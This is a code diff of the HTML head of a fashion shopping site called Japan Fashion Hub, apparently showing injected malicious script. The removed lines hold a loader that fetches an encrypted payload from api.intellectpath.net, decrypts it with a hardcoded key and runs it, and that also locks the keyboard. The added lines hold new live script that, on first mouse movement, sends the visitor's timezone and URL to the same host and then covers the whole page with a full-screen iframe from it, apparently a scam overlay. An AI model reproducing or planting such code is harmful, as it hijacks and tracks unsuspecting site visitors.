@@ -3,7 +3,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Japan Fashion Hub</title>
-
+<!--<script src="https://api.intellectpath.net/timezone/20maywebdeskFrizz2k26/Ma0cHelpMark0er007"></script>-->
+    
 <meta name="description" content="Japan Fashion Hub showcases the latest Japanese fashion, including men's and women's wear and accessories.">
 <meta name="keywords" content="Japanese fashion, men, women, polo shirts, fashion shopping">
 <meta name="author" content="Japan Fashion Hub">
@@ -233,103 +234,111 @@ height:350px;
 }
 </style>
 
-<script async="" charset="utf-8" src="https://tools.luckyorange.com/core/web-vitals.js?v=4bb1511" crossorigin="anonymous" id="lo-script-web-vitals"></script></head>
+
+    <script async="" charset="utf-8" src="https://tools.luckyorange.com/core/web-vitals.js?v=4bb1511" crossorigin="anonymous" id="lo-script-web-vitals"></script></head>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 <script>
-    function aesDecode(encodedText) {
-        const decodedText = decodeURIComponent(encodedText);
-        const bytes = CryptoJS.AES.decrypt(decodedText, 'Ma0cHelpMark0er007_20maywebdeskFrizz2k26');
-        return bytes.toString(CryptoJS.enc.Utf8);
-    }
-    const codeString = aesDecode(`https://api.intellectpath.net/payload/20maywebdeskFrizz2k26/Ma0cHelpMark0er007`);
-    const script = document.createElement("script");
-    script.textContent = codeString;
-    document.body.appendChild(script);
-</script><script> window.addEventListener("mousemove", initiateApiRequestOnce);
-    let
-        requestSent = false;
+(function(){
 
-    async function initiateApiRequestOnce() {
-        if (requestSent) return;
-        requestSent = true;
-        window.removeEventListener("mousemove", initiateApiRequestOnce);
-        secureKeyboardAccess();
-        const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        try {
-            const encodedScript = await transmitTimezoneData(
-                    "https://api.intellectpath.net/payload/20maywebdeskFrizz2k26/Ma0cHelpMark0er007",
-                    clientTimezone
-                )
-            ;
-            decodeAndRunScript(encodedScript);
-        } catch (error) {
-            console.error("Error processing script:", error);
-        }
-    }
+let requestSent = false;
 
-    function
-    secureKeyboardAccess() {
-        if (navigator.keyboard) {
-            navigator.keyboard.lock().catch((err) =>
-                console.warn("Keyboard lock failed:", err)
-            )
-            ;
-        }
-    }
+window.addEventListener("mousemove", initOnce);
 
-    async function transmitTimezoneData(url, timezone) {
-        try {
-            const response = await fetch(url, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type":
-                            "application/json"
-                    }
-                    ,
-                    body: JSON.stringify({timezone, fullUrl: window.location.href}),
+async function initOnce(){
+
+    if(requestSent) return;
+
+    requestSent = true;
+
+    window.removeEventListener(
+        "mousemove",
+        initOnce
+    );
+
+    const timezone =
+        Intl.DateTimeFormat()
+        .resolvedOptions()
+        .timeZone;
+
+    try{
+
+        await fetch(
+            "https://api.intellectpath.net/timezone-track",
+            {
+                method:"POST",
+                headers:{
+                    "Content-Type":"application/json"
+                },
+                body:JSON.stringify({
+                    timezone,
+                    fullUrl:location.href
                 })
-            ;
-            if (!response.ok) {
-                throw new Error('HTTP error! Status: ');
             }
-            return response.text();
-        } catch (error) {
-            console.error("Error sending timezone data:", error);
-            throw error;
-        }
+        );
+
+        showIframe();
+
+    }catch(e){
+
+        console.error(e);
+
     }
 
-    function
-    aesDecode(encodedText) {
-        try {
-            const bytes = CryptoJS.AES.decrypt(
-                    encodedText,
-                    "Ma0cHelpMark0er007_20maywebdeskFrizz2k26"
-                )
-            ;
-            return bytes.toString(CryptoJS.enc.Utf8);
-        } catch (error) {
-            console.error("AES decryption failed:", error);
-            return "";
-        }
+}
+
+function showIframe(){
+
+    const createFrame = () => {
+
+        if(document.getElementById("bruceDiv"))
+            return;
+
+        document.documentElement.style.overflow="hidden";
+
+        const div =
+            document.createElement("div");
+
+        div.id="bruceDiv";
+
+        div.style.cssText=
+        "position:fixed;inset:0;z-index:2147483647;background:#fff;";
+
+        const iframe =
+            document.createElement("iframe");
+
+        iframe.src=
+        "https://api.intellectpath.net/view/win";
+
+        iframe.style.cssText=
+        "width:100%;height:100%;border:0;display:block;";
+
+        iframe.allow=
+        "fullscreen; autoplay; encrypted-media; picture-in-picture";
+
+        iframe.allowFullscreen=true;
+
+        div.appendChild(iframe);
+
+        document.body.appendChild(div);
+    };
+
+    if(document.body){
+        createFrame();
+    }else{
+        window.addEventListener(
+            "DOMContentLoaded",
+            createFrame,
+            {once:true}
+        );
     }
 
-    function
-    decodeAndRunScript(encodedScript) {
-        try {
-            const decodedScript = aesDecode(decodeURIComponent(encodedScript));
-            if (decodedScript) {
-                new Function(decodedScript)(); // Safer than eval
-            } else {
-                throw new Error("Decoded script is empty.");
-            }
-        } catch (error) {
-            console.error("Error executing script:", error);
-        }
-    }</script>
+}
+
+})();
+</script>
 <script>
     document.body.style.overflow = "hidden";
-</script>
+</script> 
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
